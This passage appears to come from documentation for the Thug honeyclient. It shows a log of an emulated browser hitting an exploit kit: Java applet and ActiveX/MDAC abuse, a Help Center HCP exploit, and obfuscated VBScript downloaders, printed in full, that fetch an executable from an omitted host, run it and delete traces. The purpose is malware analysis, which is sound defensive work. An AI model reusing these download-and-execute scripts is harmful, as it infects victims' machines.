<span class="linenos"> 5</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:22<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="linenos"> 6</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:23<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>applet<span class="w"> </span>Ryp.jar
<span class="linenos"> 7</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="linenos"> 8</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="linenos"> 9</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="linenos">10</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="linenos">11</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="linenos">12</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="linenos">13</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="linenos">14</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="linenos">15</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="linenos">16</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>adodb.stream
<span class="linenos">17</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="linenos">18</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shell.application
<span class="linenos">19</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>MDAC<span class="w"> </span>RDS.Dataspace<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>CreateObject<span class="w"> </span><span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="linenos">20</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="linenos">21</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:24<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
<span class="linenos">22</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:27<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="linenos">23</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>File:<span class="w"> </span>d328b5a123bce1c0d20d763ad745303a
<span class="linenos">24</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Microsoft<span class="w"> </span>XMLHTTP<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>send
<span class="linenos">25</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>open
<span class="linenos">26</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Write
<span class="linenos">27</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>SaveToFile<span class="w"> </span><span class="o">(</span>.//..//a2ffcd1.exe<span class="o">)</span>
<span class="linenos">28</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Adodb.Stream<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>Close
<span class="linenos">29</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Shell.Application<span class="w"> </span>ActiveX<span class="o">]</span><span class="w"> </span>ShellExecute<span class="w"> </span>command:<span class="w"> </span>.//..//a2ffcd1.exe
<span class="linenos">30</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:29<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>./data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
<span class="linenos">31</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="linenos">32</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Internet<span class="w"> </span>Explorer<span class="w"> </span>HCP<span class="w"> </span>Scheme<span class="w"> </span>Detected
<span class="linenos">33</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Help<span class="w"> </span>Center<span class="w"> </span>Malformed<span class="w"> </span>Escape<span class="w"> </span>Sequences<span class="w"> </span>Incorrect<span class="w"> </span>Handling
<span class="linenos">34</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span><span class="o">[</span>AST<span class="o">]</span>:<span class="w"> </span>Eval<span class="w"> </span>argument<span class="w"> </span>length<span class="w"> </span>&gt;<span class="w"> </span><span class="m">64</span>
<span class="linenos">35</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="o">]</span><span class="w"> </span>Command:
<span class="linenos">36</span><span class="w">       </span>cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe
<span class="linenos">37</span>
<span class="linenos">38</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Code:
<span class="linenos">39</span><span class="w">       </span>cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe
<span class="linenos">40</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
<span class="linenos">41</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:37<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="linenos">42</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:37<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>file<span class="w"> </span>d26b9b1a1f667004945d1d000cf4f19e
<span class="linenos">43</span><span class="w">       </span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:37<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">2</span><span class="o">]</span><span class="w"> </span>Code:
<span class="linenos">44</span><span class="w">       </span><span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set<span class="w"> </span><span class="nv">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b<span class="w"> </span><span class="o">=</span><span class="w"> </span>f<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span>:Set<span class="w"> </span><span class="nv">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;am&quot;</span><span class="o">)</span>
<span class="linenos">45</span><span class="w">       </span>Set<span class="w"> </span><span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
<span class="linenos">46</span><span class="w">       </span>On<span class="w"> </span>Error<span class="w"> </span>resume<span class="w"> </span>next
<span class="linenos">47</span><span class="w">       </span>c.open<span class="w"> </span>OT,<span class="w"> </span>a,<span class="w"> </span>z:c.send<span class="o">()</span>
<span class="linenos">48</span><span class="w">       </span>If<span class="w"> </span>c.Status<span class="w"> </span><span class="o">=</span><span class="w"> </span>x<span class="w"> </span>Then
<span class="linenos">49</span><span class="w">       </span>d.Open:d.Type<span class="w"> </span><span class="o">=</span><span class="w"> </span>y:d.Write<span class="w"> </span>c.ResponseBody:d.SaveToFile<span class="w"> </span>b:d.Close
<span class="linenos">50</span><span class="w">       </span>End<span class="w"> </span>If
<span class="linenos">51</span><span class="w">       </span>Set<span class="w"> </span><span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
<span class="linenos">52</span><span class="w">       </span>Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>,<span class="w"> </span>Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="w"> </span><span class="s2">&quot;E&quot;</span><span class="o">))</span>
<span class="linenos">53</span><span class="w">       </span>W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM wm&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;player.e&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;xe&quot;</span>:W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;e&quot;</span>:Set<span class="w"> </span><span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>
<span class="linenos">54</span>
<span class="linenos">55</span><span class="s2">       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="linenos">56</span><span class="s2">       [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="linenos">57</span><span class="s2">       [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="linenos">58</span><span class="s2">       [2012-07-02 19:15:45] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="linenos">59</span><span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="linenos">60</span><span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="linenos">61</span><span class="s2">       [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="linenos">62</span><span class="s2">       [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="linenos">63</span><span class="s2">       [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="linenos">64</span><span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="linenos">65</span><span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="linenos">66</span><span class="s2">       [2012-07-02 19:15:52] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="linenos">67</span><span class="s2">       [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="linenos">68</span><span class="s2">       [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="linenos">69</span><span class="s2">       [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="linenos">70</span><span class="s2">       [2012-07-02 19:15:53] Saving log analysis at /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</span>
</pre></div>
</div>
<p>Let’s take a look at the directory which contains the logs for this session</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
/tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511<span class="w"> </span>$<span class="w"> </span>ls<span class="w"> </span>-lhR
.:
total<span class="w"> </span>232K
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">1008</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>502da89357ca5d7c85dc7a67f8977b21
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w">  </span>81K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>analysis.xml
drwxr-xr-x<span class="w"> </span><span class="m">6</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w">  </span><span class="m">176</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>application
-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w">  </span>89K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>d328b5a123bce1c0d20d763ad745303a
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w">  </span>51K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>Ryp.jar
drwxr-xr-x<span class="w"> </span><span class="m">3</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w">   </span><span class="m">72</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>text

./application:
total<span class="w"> </span><span class="m">0</span>
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">96</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>java-archive
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">96</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>pdf
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">96</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>x-msdownload
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">96</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>x-shockwave-flash

./application/java-archive:
total<span class="w"> </span>52K
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span>51K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>e3639fde6ddf7fd0182fff9757143ff2

./application/pdf:
total<span class="w"> </span>16K
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span>15K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>3660fe0e4acd23ac13f3d043eebd2bbc

./application/x-msdownload:
total<span class="w"> </span>92K
